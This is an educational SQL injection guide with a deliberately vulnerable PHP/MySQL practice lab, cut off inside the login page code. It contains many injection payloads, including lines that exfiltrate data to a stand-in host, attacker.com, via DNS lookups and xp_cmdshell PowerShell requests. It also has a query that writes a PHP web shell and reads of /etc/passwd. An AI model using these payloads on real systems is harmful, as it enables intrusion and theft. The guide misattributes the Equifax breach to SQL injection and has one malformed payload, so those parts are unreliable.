# SQL Injection (SQLi) — Complete Guide

## Table of Contents

1. [What is SQL Injection?](#1-what-is-sql-injection)
2. [How Databases Work (The Basics)](#2-how-databases-work-the-basics)
3. [Types of SQL Injection](#3-types-of-sql-injection)
4. [SQLi Techniques — Deep Dive](#4-sqli-techniques--deep-dive)
5. [Setting Up a Local SQLi Lab](#5-setting-up-a-local-sqli-lab)
6. [Hands-On Lab Exercises](#6-hands-on-lab-exercises)
7. [Bypassing Filters & WAFs](#7-bypassing-filters--wafs)
8. [Automated SQLi Tools](#8-automated-sqli-tools)
9. [Preventing SQL Injection](#9-preventing-sql-injection)
10. [Cheatsheet & Quick Reference](#10-cheatsheet--quick-reference)
11. [Practice Resources](#11-practice-resources)

---

## 1. What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It occurs when user-supplied data is directly concatenated into SQL queries without proper sanitization or parameterization.

### The Core Problem

```php
// VULNERABLE CODE — NEVER DO THIS
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

If an attacker enters `' OR '1'='1` as the username, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always true, this returns **all users**. The attacker logs in as the first user — often `admin`.

### What Can an Attacker Do?

| Action | Description |
|--------|-------------|
| **Bypass authentication** | Log in as any user without knowing their password |
| **Extract data** | Steal usernames, passwords, credit cards, personal info |
| **Modify data** | Change prices, balances, permissions |
| **Delete data** | Drop tables, wipe databases |
| **Execute commands** | On some databases, read/write files or execute OS commands |
| **Privilege escalation** | Gain admin access to the application or server |

### Real-World Impact

- **2017 — Equifax breach**: SQL injection in a web application led to the exposure of 147 million people's personal data. Settlement cost: $1.4 billion.
- **2008 — Heartland Payment Systems**: SQLi led to the theft of 130 million credit card numbers.
- **2015 — TalkTalk**: SQLi attack cost the company £60 million and lost 100,000 customers.

---

## 2. How Databases Work (The Basics)

### What is a Database?

A database is an organized collection of data. Most web applications use **Relational Databases** that store data in tables with rows and columns.

### Common Databases

| Database | Default Port | Notable Features |
|----------|-------------|------------------|
| **MySQL** | 3306 | Most common for web apps, open source |
| **MariaDB** | 3306 | MySQL fork, drop-in replacement |
| **PostgreSQL** | 5432 | Advanced features, JSON support |
| **Microsoft SQL Server** | 1433 | Windows ecosystem, T-SQL |
| **Oracle** | 1521 | Enterprise, PL/SQL |
| **SQLite** | File-based | Embedded, no server needed |

### SQL Language Basics

SQL (Structured Query Language) is used to communicate with databases.

**Key Operations:**

```sql
-- SELECT: Retrieve data
SELECT * FROM users;
SELECT username, email FROM users WHERE id = 1;

-- INSERT: Add new data
INSERT INTO users (username, password, email) VALUES ('admin', 'secret123', 'admin@site.com');

-- UPDATE: Modify existing data
UPDATE users SET password = 'newpass' WHERE username = 'admin';

-- DELETE: Remove data
DELETE FROM users WHERE username = 'test';

-- UNION: Combine results from multiple SELECT queries
SELECT name, price FROM products WHERE category = 'electronics'
UNION
SELECT username, password FROM users;

-- Comments
--  : Single-line comment (MySQL requires whitespace after `--`; use `-- -` for reliability)
#   : Single-line comment (MySQL only)
/* */ : Multi-line comment (all)
```

### How a Web App Talks to the Database

```
User Input (form) → Web App (PHP/Python/Node.js) → SQL Query → Database → Results → Web App → Browser
```

The problem: if user input is **directly inserted** into the SQL query, the user becomes part of the query construction.

---

## 3. Types of SQL Injection

### 3.1 In-Band SQLi (Classic)

The attacker uses the **same channel** to inject and receive results. Most common and easiest to exploit.

#### a) Error-Based SQLi

Relies on error messages from the database to extract information.

```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```

If the database version is returned in an error message, you can extract data piece by piece.

#### b) UNION-Based SQLi

Uses the `UNION` operator to combine results from the original query with results from a malicious query.

```sql
' UNION SELECT username, password FROM users --
```

**Key requirement**: The number of columns in both queries must match.

### 3.2 Inferential (Blind) SQLi

The attacker doesn't see the data directly. Instead, they infer information based on the application's behavior.

#### a) Boolean-Based Blind SQLi

Asks true/false questions and observes differences in the response.

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
```

If the page loads normally, the first character is 'a'. If not, try 'b', 'c', etc.

#### b) Time-Based Blind SQLi

If boolean responses are indistinguishable (same page for true/false), use time delays.

```sql
' IF (SELECT COUNT(*) FROM users) > 5 WAITFOR DELAY '0:0:5' --
' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) --
```

If the page takes 5 seconds to load, the condition is true.

### 3.3 Out-of-Band SQLi

Data is exfiltrated through a **different channel** (e.g., DNS lookup, HTTP request).

Used when:
- The database is very locked down
- You can't see the response directly
- You need to extract data from a non-web channel

```sql
-- MySQL: Send data via DNS lookup
' LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\test')) --

-- MSSQL: Send data via HTTP request
' EXEC master..xp_cmdshell 'powershell Invoke-WebRequest -Uri http://attacker.com/?data=' + (SELECT @@version) --
```

### 3.4 Second-Order SQLi

The payload is stored in the database and executed **later** by a different query.

**Example flow:**
1. Attacker registers with username: `' OR 1=1; DROP TABLE users --`
2. The registration query safely parameterizes the input (no injection on insert)
3. Later, an admin views user profiles and the application runs:
   ```sql
   SELECT * FROM users WHERE username = '' OR 1=1; DROP TABLE users --'
   ```
4. The injection fires when the stored data is **used** in a query.

This is harder to detect because the initial input doesn't cause an error.

---

## 4. SQLi Techniques — Deep Dive

### 4.1 Identifying SQL Injection Points

**Every input that touches the database is a potential injection point:**

| Input Point | Example |
|-------------|---------|
| URL parameters | `http://site.com/page.php?id=1` |
| Form fields | Login, search, contact forms |
| HTTP headers | User-Agent, Cookie, Referer |
| JSON/API data | `{"username": "admin' -- -"}` |
| File upload metadata | Filenames, EXIF data |

**Testing with simple payloads:**

```text
Input: 1          → Normal, works fine
Input: 1'         → Error (string not terminated)
Input: 1"         → Error (double quote not terminated)
Input: 1' OR '1'='1  → Works, returns all records
Input: 1' AND '1'='2  → Different result than '1'='1' → Injection confirmed
Input: 1' AND SLEEP(5) --  → Page loads after 5 seconds → Blind injection confirmed
Input: 1 UNION SELECT 1  → Error if column count mismatch
Input: 1 UNION SELECT 1,2,3  → Works if 3 columns exist
```

### 4.2 Finding the Number of Columns (for UNION attacks)

**Method 1: ORDER BY**

```sql
' ORDER BY 1 --   → Works
' ORDER BY 2 --   → Works
' ORDER BY 3 --   → Works
' ORDER BY 4 --   → Error (only 3 columns)
```

When you get an error, the number of columns = last successful number.

**Method 2: UNION SELECT with NULLs**

```sql
' UNION SELECT NULL --       → Error (wrong column count)
' UNION SELECT NULL,NULL --   → Error
' UNION SELECT NULL,NULL,NULL --  → Works (3 columns)
```

Use NULL instead of numbers to avoid type conflicts.

### 4.3 Finding the Database Version

```sql
-- MySQL/MariaDB
' UNION SELECT @@version, NULL, NULL --

-- PostgreSQL
' UNION SELECT version(), NULL, NULL --

-- MSSQL
' UNION SELECT @@version, NULL, NULL --

-- Oracle
' UNION SELECT banner, NULL FROM v$version --
' UNION SELECT * FROM v$version --
```

### 4.4 Finding the Database Name

```sql
-- MySQL
' UNION SELECT database(), NULL, NULL --

-- PostgreSQL
' UNION SELECT current_database(), NULL, NULL --

-- MSSQL
' UNION SELECT DB_NAME(), NULL, NULL --

-- Oracle
' UNION SELECT name FROM v$database --
```

### 4.5 Finding All Tables in the Database

```sql
-- MySQL/MariaDB (information_schema is the metadata database)
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --

-- PostgreSQL
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public' --

-- MSSQL
' UNION SELECT name, NULL, NULL FROM sysobjects WHERE xtype='U' --

-- Oracle
' UNION SELECT table_name, NULL, NULL FROM all_tables --
```

### 4.6 Finding Column Names in a Specific Table

```sql
-- MySQL
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- PostgreSQL
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

-- MSSQL
' UNION SELECT name, NULL, NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') --

-- Oracle
' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='USERS' --
```

### 4.7 Extracting Data

Once you know the table and column names:

```sql
' UNION SELECT username, password, email FROM users --
' UNION SELECT id, username, password FROM admin_users --
' UNION CONCAT(username, ':', password), NULL, NULL FROM users --
```

### 4.8 Concatenation (Combine Multiple Columns)

```sql
-- MySQL
' UNION SELECT CONCAT(username, ':', password), NULL, NULL FROM users --

-- PostgreSQL
' UNION SELECT username || ':' || password, NULL, NULL FROM users --

-- MSSQL
' UNION SELECT username + ':' + password, NULL, NULL FROM users --

-- Oracle
' UNION SELECT username || ':' || password, NULL, NULL FROM users --
```

### 4.9 Reading Files (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL --
' UNION SELECT LOAD_FILE('/var/www/html/config.php'), NULL, NULL --
```

Requires `FILE` privilege and the `secure_file_priv` variable to be empty.

### 4.10 Writing Files (MySQL)

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL INTO OUTFILE '/var/www/html/shell.php' --
```

This writes a web shell. Requires `FILE` privilege and write permissions.

### 4.11 Blind SQLi — Binary Search (Efficient)

Instead of testing character by character linearly, use binary search:

```sql
-- Is the first letter greater than 'm'?
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 109 --

-- Yes? Is it greater than 't'?
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 116 --

-- No? Is it greater than 'q'?
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 113 --
```

ASCII cheat: a=97, m=109, q=113, t=116, z=122, A=65, Z=90, 0=48, 9=57

With binary search, each character takes at most `log2(95) ≈ 7` requests instead of up to 95.

### 4.12 Conditional Errors (Blind with Errors)

Make the database throw an error based on a condition:

```sql
-- MySQL: If true, no error. If false, error.
' AND (SELECT IF(SUBSTRING(password,1,1)='a', (SELECT table_name FROM information_schema.tables), 'a')) --

-- MSSQL: Convert to integer — error if conversion fails
' AND 1 = (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1 ELSE 1/0 END) --
```

---

## 5. Setting Up a Local SQLi Lab

This section teaches you how to build your own vulnerable web application from scratch for practicing SQL injection safely.

### 5.1 What You'll Need

| Requirement | Details |
|-------------|---------|
| **XAMPP** (or LAMP/WAMP/MAMP) | Apache + MySQL + PHP stack |
| **Browser** | Chrome/Firefox with DevTools |
| **Text Editor** | VS Code, Sublime, or any code editor |
| **Burp Suite** | Optional, for request interception |

### 5.2 Installing XAMPP

XAMPP provides Apache, MySQL, and PHP in one package.

**Download:** https://www.apachefriends.org/

**Installation:**

```bash
# Linux (Ubuntu/Debian)
wget https://sourceforge.net/projects/xampp/files/XAMPP%20Linux/8.2.12/xampp-linux-x64-8.2.12-0-installer.run
chmod +x xampp-linux-x64-8.2.12-0-installer.run
sudo ./xampp-linux-x64-8.2.12-0-installer.run

# Start XAMPP
sudo /opt/lampp/lampp start

# Web root (place your files here)
sudo /opt/lampp/htdocs/
```

**Windows:** Download the installer, run it, start Apache and MySQL from the control panel. Web root: `C:\xampp\htdocs\`

**macOS:** Download the DMG, install, start from Manager-OSX. Web root: `/Applications/XAMPP/htdocs/`

**Verify Installation:**
- Open http://localhost/ — you should see the XAMPP dashboard
- Open http://localhost/phpmyadmin — phpMyAdmin interface

### 5.3 Creating the Database

Open **phpMyAdmin** (http://localhost/phpmyadmin) or use the MySQL command line:

```sql
-- Create database
CREATE DATABASE sqli_lab;
USE sqli_lab;

-- Create users table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    role VARCHAR(20) DEFAULT 'user'
);

-- Insert sample data (passwords are plaintext for learning purposes)
INSERT INTO users (username, password, email, role) VALUES
('admin', 'supersecret123', 'admin@sqli-lab.com', 'admin'),
('john', 'password123', 'john@example.com', 'user'),
('jane', 'janeiscool', 'jane@example.com', 'user'),
('bob', 'bobrocks', 'bob@example.com', 'user'),
('alice', 'alice123', 'alice@example.com', 'moderator');

-- Create products table
CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    price DECIMAL(10,2),
    category VARCHAR(50)
);

-- Insert product data
INSERT INTO products (name, description, price, category) VALUES
('Laptop', 'High-performance laptop', 999.99, 'Electronics'),
('Phone', 'Smartphone with great camera', 699.99, 'Electronics'),
('T-shirt', 'Cotton t-shirt, size L', 19.99, 'Clothing'),
('Book', 'Learn SQL in 24 hours', 29.99, 'Books'),
('Headphones', 'Noise cancelling headphones', 149.99, 'Electronics');

-- Create secrets table (for extra practice)
CREATE TABLE secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    secret_key VARCHAR(255),
    secret_value TEXT
);

INSERT INTO secrets (secret_key, secret_value) VALUES
('flag', 'CTF{SQL_Injection_Master}'),
('api_key', 'sk_live_1234567890abcdef'),
('db_password', 'SuperSecureDBPass!');
```

### 5.4 Building the Vulnerable Web Application

Create a folder called `sqli_lab` in your web root (`/opt/lampp/htdocs/sqli_lab/` on Linux).

#### File 1: `index.html` — Main Page

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLi Lab — Home</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>SQL Injection Lab</h1>
            <p>For educational purposes only</p>
        </header>

        <nav>
            <a href="index.html">Home</a>
            <a href="login.php">Login Challenge</a>
            <a href="search.php">Search Challenge</a>
            <a href="product.php">Product Challenge</a>
            <a href="user.php">User Profile Challenge</a>
        </nav>

        <main>
            <section class="welcome">
                <h2>Welcome to the SQL Injection Lab</h2>
                <p>This lab contains intentionally vulnerable pages for practicing SQL injection techniques.</p>
                <p><strong>Warning:</strong> Only run this on your local machine. Never deploy this to the internet.</p>
            </section>

            <section class="challenges">
                <h2>Available Challenges</h2>
                <div class="challenge-card">
                    <h3>Challenge 1: Login Bypass</h3>
                    <p>Exploit SQL injection in the login form to log in as <strong>admin</strong> without knowing the password.</p>
                    <a href="login.php" class="btn">Go to Challenge</a>
                </div>
                <div class="challenge-card">
                    <h3>Challenge 2: Search Injection</h3>
                    <p>Use UNION-based SQLi to extract data from the <strong>users</strong> table through the search bar.</p>
                    <a href="search.php" class="btn">Go to Challenge</a>
                </div>
                <div class="challenge-card">
                    <h3>Challenge 3: Product Enumeration</h3>
                    <p>Find the number of columns and extract hidden data from the product page.</p>
                    <a href="product.php" class="btn">Go to Challenge</a>
                </div>
                <div class="challenge-card">
                    <h3>Challenge 4: Blind Injection</h3>
                    <p>The user profile page doesn't show data directly. Use blind SQLi to extract information.</p>
                    <a href="user.php" class="btn">Go to Challenge</a>
                </div>
            </section>
        </main>

        <footer>
            <p>DIT Cyber Club — SQL Injection Lab</p>
        </footer>
    </div>
</body>
</html>
```

#### File 2: `style.css` — Styling

```css
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap');

:root {
    --bg-sky: #f2f8ff;
    --bg-sun: #fff6db;
    --bg-mint: #dff8f0;
    --card: #ffffff;
    --card-soft: #f8fbff;
    --ink-strong: #12324a;
    --ink-mid: #2a5269;
    --ink-soft: #5a7a8f;
    --accent-hot: #ef5f3c;
    --accent-warm: #ff8f3f;
    --accent-cool: #189ab4;
    --success: #117a52;
    --danger: #b33434;
    --warning: #b86b00;
    --radius-lg: 20px;
    --radius-md: 14px;
    --radius-sm: 10px;
    --shadow-main: 0 22px 55px rgba(19, 40, 61, 0.16);
    --shadow-soft: 0 10px 28px rgba(19, 40, 61, 0.1);
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html,
body {
    min-height: 100%;
}

body {
    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
    line-height: 1.62;
    color: var(--ink-strong);
    background:
        radial-gradient(circle at 10% 20%, rgba(255, 167, 105, 0.25), transparent 42%),
        radial-gradient(circle at 88% 12%, rgba(24, 154, 180, 0.2), transparent 42%),
        linear-gradient(140deg, var(--bg-sky) 0%, var(--bg-sun) 52%, var(--bg-mint) 100%);
    padding: clamp(14px, 2.6vw, 28px);
    overflow-x: hidden;
    position: relative;
}

body::before,
body::after {
    content: '';
    position: fixed;
    width: 280px;
    height: 280px;
    border-radius: 50%;
    pointer-events: none;
    filter: blur(2px);
    z-index: 0;
    animation: drift 14s ease-in-out infinite;
}

body::before {
    background: radial-gradient(circle, rgba(239, 95, 60, 0.2) 0%, rgba(239, 95, 60, 0.05) 60%, transparent 100%);
    top: -90px;
    right: -80px;
}

body::after {
    background: radial-gradient(circle, rgba(24, 154, 180, 0.2) 0%, rgba(24, 154, 180, 0.04) 60%, transparent 100%);
    bottom: -120px;
    left: -60px;
    animation-delay: -5s;
}

.container {
    max-width: 1080px;
    margin: 0 auto;
    background: rgba(255, 255, 255, 0.94);
    border: 1px solid rgba(255, 255, 255, 0.75);
    border-radius: var(--radius-lg);
    box-shadow: var(--shadow-main);
    backdrop-filter: blur(4px);
    overflow: hidden;
    position: relative;
    z-index: 2;
}

header {
    background: linear-gradient(122deg, #153f61 0%, #1d6d84 52%, #ef5f3c 100%);
    color: #f4fbff;
    padding: clamp(26px, 4vw, 44px) clamp(20px, 3vw, 42px);
    text-align: center;
    position: relative;
    overflow: hidden;
    isolation: isolate;
}

header::after {
    content: '';
    position: absolute;
    inset: 0;
    background-image: linear-gradient(120deg, rgba(255, 255, 255, 0.17) 0%, transparent 45%, rgba(255, 255, 255, 0.12) 100%);
    mix-blend-mode: overlay;
    z-index: -1;
}

header h1 {
    font-size: clamp(1.8rem, 3.6vw, 3rem);
    line-height: 1.1;
    letter-spacing: 0.01em;
    text-wrap: balance;
}

header p {
    font-size: clamp(0.95rem, 1.5vw, 1.07rem);
    opacity: 0.92;
    margin-top: 8px;
}

nav {
    background: linear-gradient(90deg, #133751 0%, #1f5d7e 100%);
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
    gap: 8px;
    padding: 12px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.2);
}

nav a {
    color: #eaf7ff;
    text-decoration: none;
    padding: 10px 16px;
    border-radius: 999px;
    border: 1px solid transparent;
    font-weight: 600;
    font-size: 0.95rem;
    transition: transform 0.25s ease, background-color 0.25s ease, border-color 0.25s ease;
}

nav a:hover,
nav a.active {
    background: rgba(255, 255, 255, 0.16);
    border-color: rgba(255, 255, 255, 0.34);
    transform: translateY(-1px);
}

main {
    padding: clamp(18px, 3vw, 34px);
}

section {
    margin-bottom: 28px;
}

section h2 {
    color: #0f4666;
    margin-bottom: 16px;
    font-size: clamp(1.28rem, 2.2vw, 1.8rem);
    display: inline-flex;
    align-items: center;
    gap: 10px;
}

section h2::after {
    content: '';
    display: inline-block;
    height: 3px;
    width: 54px;
    border-radius: 999px;
    background: linear-gradient(90deg, var(--accent-hot), var(--accent-cool));
}

.welcome {
    background: linear-gradient(135deg, rgba(255, 255, 255, 0.95) 0%, rgba(242, 250, 255, 0.95) 100%);
    border: 1px solid #d8ebfb;
    border-radius: var(--radius-md);
    box-shadow: var(--shadow-soft);
    padding: clamp(16px, 2.4vw, 24px);
}

.welcome p {
    margin-bottom: 8px;
    color: var(--ink-mid);
}

.welcome strong {
    color: var(--accent-hot);
}

.challenge-card {
    background: linear-gradient(150deg, #ffffff 0%, #f2f9ff 100%);
    border: 1px solid #dcecf8;
    border-radius: var(--radius-md);
    padding: clamp(16px, 2.2vw, 24px);
    margin-bottom: 14px;
    box-shadow: var(--shadow-soft);
    transition: transform 0.28s ease, box-shadow 0.28s ease, border-color 0.28s ease;
    transform-style: preserve-3d;
    will-change: transform;
}

.challenge-card:hover {
    box-shadow: 0 16px 34px rgba(15, 70, 102, 0.15);
    border-color: #b2daf3;
}

.challenge-card h3 {
    color: #0d3f5e;
    margin-bottom: 8px;
    font-size: clamp(1.06rem, 1.8vw, 1.28rem);
}

.challenge-card p {
    margin-bottom: 14px;
    color: var(--ink-mid);
}

.btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    background: linear-gradient(90deg, var(--accent-hot), var(--accent-warm));
    color: #fff;
    padding: 11px 18px;
    text-decoration: none;
    border-radius: 999px;
    border: none;
    cursor: pointer;
    font-size: 0.95rem;
    font-weight: 700;
    letter-spacing: 0.01em;
    box-shadow: 0 8px 18px rgba(239, 95, 60, 0.3);
    transition: transform 0.2s ease, filter 0.2s ease;
}

.btn:hover {
    transform: translateY(-1px);
    filter: brightness(1.05);
}

.btn:active {
    transform: translateY(0);
}

.form-group {
    margin-bottom: 14px;
}

form {
    background: var(--card-soft);
    border: 1px solid #d9eaf6;
    border-radius: var(--radius-md);
    padding: clamp(14px, 2vw, 20px);
    box-shadow: var(--shadow-soft);
}

label {
    display: block;
    margin-bottom: 6px;
    font-weight: 700;
    color: #19435e;
    font-size: 0.95rem;
}

input[type='text'],
input[type='password'],
input[type='number'],
select {
    width: 100%;
    padding: 11px 12px;
    border: 1.8px solid #cfe2f0;
    border-radius: var(--radius-sm);
    font-size: 0.98rem;
    color: #12324a;
    background: #fff;
    transition: border-color 0.22s ease, box-shadow 0.22s ease;
}

input[type='text']:focus,
input[type='password']:focus,
input[type='number']:focus,
select:focus {
    outline: none;
    border-color: var(--accent-cool);
    box-shadow: 0 0 0 4px rgba(24, 154, 180, 0.17);
}

.info-box,
.result-box,
.error-box,
.success-box,
.hint-box {
    border-radius: var(--radius-md);
    padding: clamp(12px, 1.8vw, 16px);
    margin-top: 14px;
    border: 1px solid transparent;
    box-shadow: 0 6px 18px rgba(18, 50, 74, 0.06);
}

.info-box {
    background: linear-gradient(160deg, #f0faff 0%, #ebf7ff 100%);
    border-color: #c8e5f8;
}

.info-box h4 {
    color: #0d4c73;
    margin-bottom: 8px;
}

.result-box {
    background: linear-gradient(160deg, #f8fcff 0%, #f0f8ff 100%);
    border-color: #d5e9f7;
    overflow-x: auto;
}

.result-box table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
    min-width: 560px;
}

.result-box th {
    background: #145075;
    color: #f3fbff;
    padding: 10px;
    text-align: left;
    font-size: 0.9rem;
}

.result-box td {
    padding: 9px 10px;
    border-bottom: 1px solid #deecf7;
    color: #264e67;
}

.result-box tbody tr:hover {
    background: rgba(24, 154, 180, 0.08);
}

.query-wrap {
    position: relative;
    margin-top: 10px;
}

.query-box {
    background: linear-gradient(160deg, #0f2436 0%, #173349 100%);
    color: #d6ecff;
    padding: 12px 44px 12px 12px;
    border-radius: var(--radius-sm);
    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
    font-size: 0.9rem;
    overflow-x: auto;
    white-space: pre-wrap;
    word-break: break-word;
    border: 1px solid rgba(167, 213, 241, 0.2);
}

.copy-btn {
    position: absolute;
    top: 8px;
    right: 8px;
    border: 1px solid rgba(192, 228, 255, 0.4);
    background: rgba(255, 255, 255, 0.08);
    color: #d2ebff;
    border-radius: 999px;
    padding: 4px 10px;
    font-size: 0.75rem;
    font-weight: 700;
    cursor: pointer;
    transition: background-color 0.22s ease;
}

.copy-btn:hover {
    background: rgba(255, 255, 255, 0.18);
}

.error-box {
    background: #fff2f1;
    border-color: #f3c5c2;
    color: var(--danger);
}

.success-box {
    background: #eefbf5;
    border-color: #bee9d3;
    color: var(--success);
}

.hint-box {
    background: #fff7e8;
    border-color: #f8dfb0;
    color: #654300;
}

.hint-box strong {
    color: var(--warning);
}

code {
    font-family: 'IBM Plex Mono', 'SFMono-Regular', Menlo, Consolas, 'Liberation Mono', monospace;
    background: rgba(16, 55, 78, 0.08);
    color: #0f3f5c;
    padding: 2px 6px;
    border-radius: 6px;
}

footer {
    background: linear-gradient(90deg, #133751 0%, #1a5f80 100%);
    color: #e5f6ff;
    text-align: center;
    padding: 15px;
    font-size: 0.86rem;
    letter-spacing: 0.01em;
}

.reveal {
    opacity: 0;
    transform: translateY(14px);
    animation: revealUp 0.6s ease forwards;
    animation-delay: var(--reveal-delay, 0ms);
}

@keyframes revealUp {
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes drift {
    0%,
    100% {
        transform: translateY(0) translateX(0);
    }
    50% {
        transform: translateY(-14px) translateX(8px);
    }
}

@media (max-width: 760px) {
    nav {
        justify-content: flex-start;
        padding: 10px;
    }

    nav a {
        font-size: 0.88rem;
        padding: 8px 12px;
    }

    .result-box table {
        min-width: 460px;
    }
}

@media (prefers-reduced-motion: reduce) {
    * {
        animation: none !important;
        transition: none !important;
    }
}
```

#### File 3: `script.js` — Interactivity

```javascript
document.addEventListener('DOMContentLoaded', () => {
    const current = window.location.pathname.split('/').pop() || 'index.html';

    document.querySelectorAll('nav a').forEach((link) => {
        const href = link.getAttribute('href') || '';
        if (href === current || (current === '' && href === 'index.html')) {
            link.classList.add('active');
        }
    });

    const revealTargets = [
        ...new Set([
            ...document.querySelectorAll('header, nav, main > *, .challenge-card, .result-box, .info-box, .hint-box, form')
        ])
    ];

    revealTargets.forEach((el, index) => {
        el.classList.add('reveal');
        el.style.setProperty('--reveal-delay', `${Math.min(index * 70, 700)}ms`);
    });

    document.querySelectorAll('.challenge-card, .info-box, .result-box').forEach((card) => {
        card.addEventListener('mousemove', (event) => {
            const rect = card.getBoundingClientRect();
            const x = event.clientX - rect.left;
            const y = event.clientY - rect.top;
            const rotateX = ((y / rect.height) - 0.5) * -5;
            const rotateY = ((x / rect.width) - 0.5) * 5;
            card.style.transform = `perspective(800px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg)`;
        });

        card.addEventListener('mouseleave', () => {
            card.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg)';
        });
    });

    document.querySelectorAll('.query-box').forEach((box) => {
        const wrapper = document.createElement('div');
        wrapper.className = 'query-wrap';
        box.parentNode.insertBefore(wrapper, box);
        wrapper.appendChild(box);

        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'copy-btn';
        btn.textContent = 'Copy';

        btn.addEventListener('click', async () => {
            const text = box.innerText.trim();
            if (!text) {
                return;
            }

            try {
                await navigator.clipboard.writeText(text);
                btn.textContent = 'Copied';
                setTimeout(() => {
                    btn.textContent = 'Copy';
                }, 1200);
            } catch (_err) {
                btn.textContent = 'Denied';
                setTimeout(() => {
                    btn.textContent = 'Copy';
                }, 1200);
            }
        });

        wrapper.appendChild(btn);
    });
});
```

#### File 4: `login.php` — Login Bypass Challenge

```php
<?php
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'sqli_lab';

$conn = null;
$db_error = null;
try {
    $conn = new mysqli($host, $user, $pass, $db);
    $conn->set_charset('utf8mb4');
} catch (mysqli_sql_exception $e) {
    $db_error = $e->getMessage();
}

$result = null;
$error = null;
$query = null;
$user_data = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // VULNERABLE QUERY — Intentionally vulnerable for learning
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    if ($conn) {
        try {
            $result = $conn->query($query);
        } catch (mysqli_sql_exception $e) {
            $error = $e->getMessage();
            $result = null;
        }
    } else {
        $error = $db_error ?: 'Database connection failed.';
    }

    if ($result && $result->num_rows > 0) {
        $user_data = $result->fetch_assoc();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Bypass Challenge</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>Challenge 1: Login Bypass</h1>
            <p>Can you log in without knowing the password?</p>
        </header>

        <nav>
            <a href="index.html">Home</a>
            <a href="login.php">Login Challenge</a>
            <a href="search.php">Search Challenge</a>
            <a href="product.php">Product Challenge</a>
            <a href="user.php">User Profile Challenge</a>
        </nav>

        <main>
            <div class="info-box">
                <h4>Objective</h4>
                <p>Log in as <strong>admin</strong> without knowing the password. The query used is:</p>
                <div class="query-box">SELECT * FROM users WHERE username = '$username' AND password = '$password'</div>
            </div>

            <form method="POST" action="">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password">
                </div>
                <button type="submit" class="btn">Login</button>
            </form>

            <?php if ($query): ?>
                <div class="result-box">
                    <strong>Query executed:</strong>
                    <div class="query-box"><?php echo htmlspecialchars($query); ?></div>
                </div>
            <?php endif; ?>

            <?php if ($error): ?>
                <div class="error-box">
                    <strong>Database error:</strong> <?php echo htmlspecialchars($error); ?>
                </div>
            <?php endif; ?>

            <?php if ($db_error && $_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
                <div class="error-box">
                    <strong>Database connection error:</strong> <?php echo htmlspecialchars($db_error); ?>
                </div>
            <?php endif; ?>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if ($user_data) {
                    echo '<div class="success-box">';
                    echo '<h3>Login Successful!</h3>';
                    echo '<p>Welcome, <strong>' . htmlspecialchars($user_data['username']) . '</strong></p>';
                    echo '<p>Your role: <strong>' . htmlspecialchars($user_data['role']) . '</strong></p>';
